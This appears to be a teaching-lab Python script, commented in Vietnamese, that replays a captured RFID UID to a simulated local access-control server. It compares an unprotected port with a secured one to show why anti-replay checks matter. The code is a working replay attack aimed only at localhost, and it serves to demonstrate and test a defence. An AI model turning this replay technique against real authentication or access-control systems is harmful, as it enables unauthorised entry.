#!/usr/bin/env python3
"""
Replay Attack Tool — gửi lại UID đã bắt được tới Access Control Server
Dùng để chứng minh lỗ hổng khi server không có anti-replay.

Usage:
    python replay_attack.py              # Tấn công AC thường (port 7001) — VULNERABLE
    python replay_attack.py --secure     # Tấn công Secure AC (port 7002) — BLOCKED
"""

import socket, json, time, sys
from datetime import datetime
from colorama import Fore, init
init(autoreset=True)

# Chọn port theo argument
SECURE_MODE = '--secure' in sys.argv
AC_HOST = '127.0.0.1'
AC_PORT = 7002 if SECURE_MODE else 7001

STOLEN_UID = 'A1B2C3D4E5'   # UID bắt được từ eavesdropper


class ReplayAttack:
    """Replay attack tool"""

    def __init__(self):
        self.captured_frames = []
        self.replay_count = 0

    def capture_frame(self, frame_data: dict):
        """Capture a frame for later replay"""
        self.captured_frames.append(frame_data)
        print(f"{Fore.YELLOW}[+] Frame captured for replay: {frame_data}")

    def replay_frame(self, frame_index: int) -> dict:
        """Replay a captured frame"""
        if 0 <= frame_index < len(self.captured_frames):
            frame = self.captured_frames[frame_index].copy()
            frame["replayed_at"] = datetime.now().isoformat()
            self.replay_count += 1
            print(f"{Fore.RED}[+] Frame replayed: {frame}")
            return frame
        return None

    def replay_all_frames(self) -> list:
        """Replay all captured frames"""
        replayed = []
        for i in range(len(self.captured_frames)):
            replayed.append(self.replay_frame(i))
        return replayed

    def get_replay_count(self) -> int:
        """Get total number of replays"""
        return self.replay_count


def send_auth(uid: str, timestamp: float) -> dict:
    """Gửi yêu cầu xác thực tới AC server"""
    s = socket.socket()
    s.settimeout(2)
    s.connect((AC_HOST, AC_PORT))
    s.send(json.dumps({'cmd': 'AUTH', 'uid': uid, 'timestamp': timestamp}).encode())
    resp = json.loads(s.recv(512).decode())
    s.close()
    return resp


if __name__ == "__main__":
    mode_label = f"SECURE AC (port {AC_PORT}) — Defense ON" if SECURE_MODE else f"AC Server (port {AC_PORT}) — No Defense"
    print(f"{Fore.RED}=== RFID Replay Attack ===")
    print(f"{Fore.CYAN}Target: {mode_label}\n")

    # Bước 1: Mô phỏng bắt frame từ eavesdropper
    replay = ReplayAttack()
    replay.capture_frame({"uid": STOLEN_UID, "command": "AUTH"})

    # Bước 2: Lần 1 — gửi với timestamp hiện tại (giả lập lần xác thực đầu)
    ts = time.time()
    print(f"{Fore.YELLOW}[*] Sending AUTH lần 1 (timestamp hợp lệ: {ts:.1f})...")
    try:
        resp1 = send_auth(STOLEN_UID, ts)
        color = Fore.GREEN if resp1.get('status') == 'GRANTED' else Fore.RED
        print(f"{color}[Lần 1] → {resp1.get('status')} {resp1.get('owner','')}")
    except Exception as e:
        print(f"{Fore.RED}[Lần 1] Kết nối thất bại: {e}")
        sys.exit(1)

    # Bước 3: Lần 2 — REPLAY cùng timestamp (attacker phát lại)
    print(f"\n{Fore.RED}[*] REPLAY: Gửi lại AUTH với CÙNG timestamp ({ts:.1f})...")
    try:
        resp2 = send_auth(STOLEN_UID, ts)
        color = Fore.GREEN if resp2.get('status') == 'GRANTED' else Fore.RED
        icon = '⚠️  TẤN CÔNG THÀNH CÔNG' if resp2.get('status') == 'GRANTED' else '✅ BỊ CHẶN'
        print(f"{color}[Lần 2 - Replay] → {resp2.get('status')} — {resp2.get('msg', resp2.get('owner', ''))} {icon}")
    except Exception as e:
        print(f"{Fore.RED}[Lần 2] Kết nối thất bại: {e}")

    # Bước 4: Lần 3 — timestamp cũ (100 giây trước)
    old_ts = time.time() - 100
    print(f"\n{Fore.RED}[*] REPLAY với timestamp CŨ (100 giây trước: {old_ts:.1f})...")
    try:
        resp3 = send_auth(STOLEN_UID, old_ts)
        color = Fore.GREEN if resp3.get('status') == 'GRANTED' else Fore.RED
        icon = '⚠️  TẤN CÔNG THÀNH CÔNG' if resp3.get('status') == 'GRANTED' else '✅ BỊ CHẶN'
        print(f"{color}[Lần 3 - Old TS] → {resp3.get('status')} — {resp3.get('msg', resp3.get('owner', ''))} {icon}")
    except Exception as e:
        print(f"{Fore.RED}[Lần 3] Kết nối thất bại: {e}")

    print(f"\n{Fore.CYAN}Replays attempted: {replay.get_replay_count()}")

